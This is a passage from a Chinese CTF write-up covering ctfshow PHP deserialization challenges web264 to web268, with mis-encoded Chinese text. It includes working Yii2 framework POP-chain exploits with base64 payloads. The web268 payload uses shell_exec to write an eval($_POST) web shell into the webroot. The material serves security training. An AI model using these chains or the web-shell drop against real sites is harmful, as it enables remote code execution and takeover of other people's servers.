class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$msg_1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg_1</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹index.php ç”¨ get ä¼ å‚ payloadï¼Œä¹‹åè®¿é—® message.phpï¼Œcookie åé¢åŠ ä¸€ä¸ªï¼›msg=1 å³å¯ã€‚</p><h1 id="web265"><a class="markdownIt-Anchor" href="#web265">#</a> web265ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>php çš„ç‰¹æ€§ï¼ŒæŒ‰åœ°å€ä¼ å‚</p><p>ä¾‹å¦‚ $a = 1  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mn>2</mn><mo separator="true">,</mo><mtext>è¿™æ—¶è®©</mtext></mrow><annotation encoding="application/x-tex">b = 2, è¿™æ—¶è®©</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">è®©</span></span></span></span> b = &amp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mtext>å†ç»™</mtext></mrow><annotation encoding="application/x-tex">a, å†ç»™</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">å†</span><span class="mord cjk_fallback">ç»™</span></span></span></span> a é‡æ–°èµ‹ä¸ªå€¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mn>3</mn><mo separator="true">,</mo><mtext>è¿™ä¸ªæ—¶å€™</mtext></mrow><annotation encoding="application/x-tex">a = 3, è¿™ä¸ªæ—¶å€™</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">å€™</span></span></span></span> b å°±ä¼šä¸€ç›´è·Ÿç€ $a å˜åŒ–ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext>æ˜¯ä»€ä¹ˆ</mtext></mrow><annotation encoding="application/x-tex">aæ˜¯ä»€ä¹ˆ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">ä»€</span><span class="mord cjk_fallback">ä¹ˆ</span></span></span></span> b å°±æ˜¯ä»€ä¹ˆ</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå°±ä¼šå‘ç°ï¼Œa çš„å€¼ä¼šè·Ÿç€ b ä¸€èµ·æ”¹å˜ã€‚æ‰€ä»¥ payload å¯ä»¥å¦‚ä¸‹ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password =&amp; <span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web266"><a class="markdownIt-Anchor" href="#web266">#</a> web266ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆï¼Œ$cs = file_get_contents (â€˜php://inputâ€™);ï¼Œå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®æµï¼Œå¯ä»¥è·å–åˆ° GET å’Œ POST çš„æ•°æ®ï¼Œé‚£ä¹ˆï¼Œè¿™é‡Œå°±å¯ä»¥é€šè¿‡ post å‘ä¸€ä¸ªåŒ…ï¼Œæ•°æ®æµæ˜¯ä¸€ä¸ª ctfshow çš„ä¸€ä¸ªåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œéœ€è¦è§¦å‘ <code>__destruct</code>  æ–¹æ³•ï¼Œ ä¼ å…¥ä¸€ä¸ª <code>O:7:&quot;ctfshow&quot;:2:&#123;&#125;</code>  å³å¯è¾“å‡º flagï¼Œä½†æ˜¯å…·ä½“æ˜¯ä¸ºå•¥å°±ä¸å¤§æ¸…æ¥šäº†ï¼Œæ²¡æœ‰ä¿®æ”¹é‚£ä¸ªä¸º 2 çš„è¯ï¼Œå°±æ— æ³•è§¦å‘ destructã€‚å› ä¸ºä¼°è®¡æ˜¯ç ´ååºåˆ—åŒ–åçš„ç»“æœï¼Œä»ä¼šæ‰§è¡Œ__destructã€‚</p><h1 id="web267"><a class="markdownIt-Anchor" href="#web267">#</a> web267ï¼š</h1><p>â€‹è€ƒç‚¹ï¼Œyii æ¡†æ¶ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>â€‹æŸ¥çœ‹æºç ï¼Œåœ¨æœ€åå‘ç°å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/assets/b021fd51/yii.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æ¨æµ‹åº”è¯¥æ˜¯ yii æ¡†æ¶ï¼Œè™½ç„¶è¿˜æ²¡å­¦è¿™ä¸ªæ˜¯ä¸ªå•¥ï¼Œå³ä¸Šè§’å‘ç°äº† loginï¼Œç‚¹è¿›å»æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œè´¦å·ä¸º adminï¼Œå¼±å¯†ç çˆ†ç ´ä¸€ä¸‹ï¼Œå¾—åˆ°å¯†ç ä¸º adminï¼Œä¹‹åç‚¹å³ä¸Šè§’çš„ aboutï¼Œæœ‰ä¸€ä¸ªæ³¨é‡Šï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?view-source --&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹å‰é¢åŠ äº†ä¸ªé—®å¥½ï¼Œæ˜¯æç¤ºæˆ‘ä»¬éœ€è¦ get ä¼ å‚ï¼Œä¼ ä¸€ä¸ªåå‘ç°ååºåˆ—åŒ–çš„ä¸€ä¸ªä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///backdoor/shell</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>â€‹è¿›å…¥ yii.js åæç¤º yii ç‰ˆæœ¬ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Yii JavaScript module.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> http://www.yiiframework.com/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span> Copyright (c) 2008 Yii Software LLC</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span> http://www.yiiframework.com/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Qiang Xue &lt;qiang.xue<span class="doctag">@gmail</span>.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæŸ¥æ‰¾å†å²æ¼æ´æ‰¾åˆ°äº†ä¸€ä¸‹ pocï¼Œè¿™ä¸ªæ¼æ´æœ‰æ¡ä»¶å†çœ‹ï¼Œç°åœ¨å…ˆä¸çœ‹ï¼Œç›´æ¥ç”¨ poc æ‰“ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åé€šè¿‡ get ä¸Šä¼ ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=/backdoor/shell<span class="built_in">&amp;</span>code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure><p>â€‹å°±èƒ½æ‰“å‡º phpinfoï¼Œä¹‹åä½¿ç”¨ passthru å³å¯è·å¾— flagï¼Œsystem æ²¡æœ‰å›æ˜¾ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥ echo ä¸€å¥è¯æœ¨é©¬è¿›ä¸€ä¸ªæ–‡ä»¶ä¹Ÿè¡Œã€‚</p><h1 id="web268"><a class="markdownIt-Anchor" href="#web268">#</a> web268ï¼š</h1><p>â€‹ç›¸æ¯”äºä¸Šä¸€é¢˜æœ‰è¿‡æ»¤ï¼Œæ¢ä¸€ä¸ª poc å³å¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &quot;<span class="title class_">echo</span> &#x27;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&#x27; &gt; /var/www/html/basic/web/1.php&quot;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize($exp)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å exp ä¸ºï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=/backdoor/shell<span 